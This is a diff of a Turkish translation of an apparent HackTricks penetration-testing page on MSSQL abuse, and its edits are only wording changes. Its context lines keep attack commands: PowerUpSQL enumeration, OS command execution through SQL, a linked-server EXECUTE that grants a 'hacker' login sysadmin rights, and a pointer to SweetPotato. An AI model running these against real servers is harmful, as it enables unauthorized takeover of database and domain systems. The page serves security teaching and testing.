@@ -90,7 +90,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Bu durumda [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) powershell modülü çok faydalıdır.
+Bu durumda powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) çok faydalıdır.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ````
@@ -127,7 +127,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Temel Suistimal
+## MSSQL Temel İstismar
 
 ### Erişim Veritabanı
 ```powershell
@@ -158,11 +158,11 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Güvenilir Bağlantılar
 
-Eğer bir MSSQL örneği başka bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa. Kullanıcı güvenilir veritabanı üzerinde yetkilere sahipse, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
+Eğer bir MSSQL örneği başka bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa. Eğer kullanıcının güvenilir veritabanı üzerinde yetkileri varsa, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
 
 **Veritabanları arasındaki bağlantılar, orman güvenleri arasında bile çalışır.**
 
-### Powershell Kötüye Kullanımı
+### Powershell Suistimali
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -208,7 +208,7 @@ Metasploit'in yalnızca MSSQL'deki `openquery()` fonksiyonunu kötüye kullanmay
 
 **Linux**'tan **sqsh** ve **mssqlclient.py** ile bir MSSQL konsol kabuğu elde edebilirsiniz.
 
-**Windows**'tan da bağlantıları bulabilir ve komutları manuel olarak çalıştırabilirsiniz, **MSSQL istemcisi gibi** [**HeidiSQL**](https://www.heidisql.com) kullanarak.
+**Windows**'tan da bağlantıları bulabilir ve komutları manuel olarak bir **MSSQL istemcisi gibi** [**HeidiSQL**](https://www.heidisql.com) kullanarak çalıştırabilirsiniz.
 
 _Windows kimlik doğrulaması ile giriş yapın:_
 
@@ -256,6 +256,6 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortadaki adam hizmetine kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
 
-[SweetPotato](https://github.com/CCob/SweetPotato), Beacon'ın `execute-assembly` komutu aracılığıyla gerçekleştirilebilecek bu çeşitli tekniklerin bir derlemesini sunmaktadır.
+[SweetPotato](https://github.com/CCob/SweetPotato), Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilen bu çeşitli tekniklerin bir derlemesini sunmaktadır.
 
 {{#include ../../banners/hacktricks-training.md}}
